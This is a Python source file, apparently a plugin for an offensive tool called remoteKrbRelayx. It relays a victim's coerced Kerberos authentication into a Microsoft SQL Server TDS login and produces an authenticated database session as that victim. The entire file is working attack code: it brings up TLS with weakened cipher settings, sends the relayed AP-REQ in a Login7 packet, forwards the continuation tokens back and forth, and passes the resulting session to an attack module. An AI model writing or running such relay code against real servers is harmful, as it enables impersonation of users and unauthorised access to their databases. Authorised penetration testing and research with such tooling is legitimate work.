# TDS (MSSQL) Relay Protocol Client for remoteKrbRelayx
#
# Relays a DCE-style raw-Kerberos authentication (coerced cross-session via DCOM)
# into an MSSQL TDS Login7/SSPI handshake, completing the 3-leg DCE exchange:
#
#   victim BIND(AP-REQ, DCE-style)  --krbauth(GSS-Kerberos-wrapped)-->  TDS Login7.SSPI
#   MSSQL  AP-REP (0xED, CONTINUE)  --raw-->  relayed back to victim in BIND_ACK
#   victim AUTH3(final leg token)   --krbauth(raw)-->  TDS_SSPI continuation
#   MSSQL  LOGINACK                 -->  authenticated TDS session as the victim
#
# Because the victim's AP-REQ carries the DCE-style flag, MSSQL's acceptor also
# follows the 3-leg exchange (AP-REP with GSS_S_CONTINUE_NEEDED, then waits for
# the client's final leg). remoteKrbRelayx's byte-perfect RPC BIND_ACK is what
# makes the victim actually emit AUTH3 (the final token we lacked when replaying).
#
# Return contract (mirrors smbrelayclient):
#   initConnection(authdata) / sendNegotiate(authdata) -> (finished, data)
#     finished=False -> data is the token to relay back to the victim (BIND_ACK)
#     finished=True  -> self.session is the authenticated MSSQL object, data=None

import random
import string
from struct import unpack_from

from impacket import LOG
from remotekrbrelayx.krbrelayx.lib.clients import ProtocolClient
from impacket.tds import (MSSQL, DummyPrint, TDS_ENCRYPT_REQ, TDS_ENCRYPT_OFF,
                          TDS_PRE_LOGIN, TDS_LOGIN, TDS_INIT_LANG_FATAL, TDS_ODBC_ON,
                          TDS_INTEGRATED_SECURITY_ON, TDS_LOGIN7, TDS_SSPI,
                          TDS_LOGINACK_TOKEN, TDS_ERROR_TOKEN)

try:
    from OpenSSL import SSL
except Exception:
    LOG.critical("pyOpenSSL is not installed, can't continue")

PROTOCOL_CLIENT_CLASS = "TDSRelayClient"


class MYMSSQL(MSSQL):
    def __init__(self, address, port=1433, rowsPrinter=DummyPrint()):
        MSSQL.__init__(self, address, port, rowsPrinter)
        self.resp = None
        self.sessionData = {}

    def initConnectionTDS(self):
        """TLS/preLogin bring-up, copied from impacket's MSSQL relay client."""
        self.connect()
        resp = self.preLogin()
        if resp['Encryption'] == TDS_ENCRYPT_REQ or resp['Encryption'] == TDS_ENCRYPT_OFF:
            LOG.debug("MSSQL: encryption required/available, switching to TLS")
            ctx = SSL.Context(SSL.TLS_METHOD)
            ctx.set_cipher_list('ALL:@SECLEVEL=0'.encode('utf-8'))
            tls = SSL.Connection(ctx, None)
            tls.set_connect_state()
            while True:
                try:
                    tls.do_handshake()
                except SSL.WantReadError:
                    data = tls.bio_read(4096)
                    self.sendTDS(TDS_PRE_LOGIN, data, 0)
                    tds = self.recvTDS()
                    tls.bio_write(tds['Data'])
                else:
                    break
            self.packetSize = 16 * 1024 - 1
            self.tlsSocket = tls
        self.resp = resp

    @staticmethod
    def _sspi_token(data):
        """Extract the token from a TDS SSPI (0xED) response token, else None."""
        if data[:1] == b'\xed':
            tlen = unpack_from('<H', data, 1)[0]
            return data[3:3 + tlen]
        return None

    def sendLogin7(self, sspi_blob):
        """Leg 1: send Login7 carrying the GSS-Kerberos-wrapped AP-REQ as SSPI."""
        login = TDS_LOGIN()
        login['HostName'] = (''.join(random.choice(string.ascii_letters) for _ in range(8))).encode('utf-16le')
        login['AppName'] = (''.join(random.choice(string.ascii_letters) for _ in range(8))).encode('utf-16le')
        login['ServerName'] = self.server.encode('utf-16le')
        login['CltIntName'] = login['AppName']
        login['ClientPID'] = random.randint(0, 1024)
        login['PacketSize'] = self.packetSize
        login['OptionFlags2'] = TDS_INIT_LANG_FATAL | TDS_ODBC_ON | TDS_INTEGRATED_SECURITY_ON
        login['SSPI'] = sspi_blob
        login['Length'] = len(login.getData())

        self.sendTDS(TDS_LOGIN7, login.getData())
        # Per TDS spec: if encryption is OFF, only the first Login7 packet is encrypted.
        if self.resp['Encryption'] == TDS_ENCRYPT_OFF:
            self.tlsSocket = None

        return self._consume(self.recvTDS())

    def sendContinuation(self, token):
        """Leg 3+: forward the victim's raw continuation token as TDS_SSPI."""
        self.sendTDS(TDS_SSPI, token)
        return self._consume(self.recvTDS())

    def _consume(self, tds):
        """Parse an MSSQL reply. Returns (finished, token_to_relay_back).

        finished=True  -> LOGINACK seen, session authenticated.
        finished=False -> an SSPI (0xED) continuation token to relay back.
        Raises on a TDS error token (login refused)."""
        data = tds['Data']
        tok = self._sspi_token(data)
        if tok is not None:
            # More legs needed: hand the server token back to the victim.
            return False, tok
        # No SSPI token: must be LOGINACK (success) or an error.
        self.replies = self.parseReply(data)
        if TDS_LOGINACK_TOKEN in self.replies:
            return True, None
        if TDS_ERROR_TOKEN in self.replies:
            for e in self.replies[TDS_ERROR_TOKEN]:
                try:
                    LOG.error("MSSQL login error #%s: %s" % (e['Number'], e['MsgText'].decode('utf-16le')))
                except Exception:
                    LOG.error("MSSQL login error: %r" % e)
            raise Exception("MSSQL rejected the relayed Kerberos login")
        raise Exception("MSSQL returned unexpected tokens: %s" % list(self.replies.keys()))

    def close(self):
        return self.disconnect()


class TDSRelayClient(ProtocolClient):
    PLUGIN_NAME = "MSSQL"

    def __init__(self, serverConfig, target, targetPort=1433, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.mssql = None

    def killConnection(self):
        if self.session is not None:
            self.session.disconnect()
            self.session = None

    def keepAlive(self):
        pass

    def initConnection(self, authdata, kdc=None):
        # First call from do_relay: bring up TDS, then relay leg 1 (AP-REQ via Login7).
        self.mssql = MYMSSQL(self.targetHost, self.targetPort)
        self.mssql.initConnectionTDS()
        LOG.info("MSSQL: TDS connection to %s:%d established, relaying Kerberos" % (self.targetHost, self.targetPort))
        return self._finish(self.mssql.sendLogin7(authdata["krbauth"]))

    def sendNegotiate(self, authdata):
        # Subsequent calls from do_relay: relay the victim's raw continuation (AUTH3) leg.
        return self._finish(self.mssql.sendContinuation(authdata["krbauth"]))

    def _finish(self, result):
        finished, token = result
        if not finished:
            return False, token
        # LOGINACK: hand the authenticated MSSQL object to the attack.
        self.session = self.mssql
        self.sessionData = self.mssql.sessionData
        LOG.info("MSSQL: LOGINACK received - authenticated to %s as the relayed user!" % self.targetHost)
        return True, None
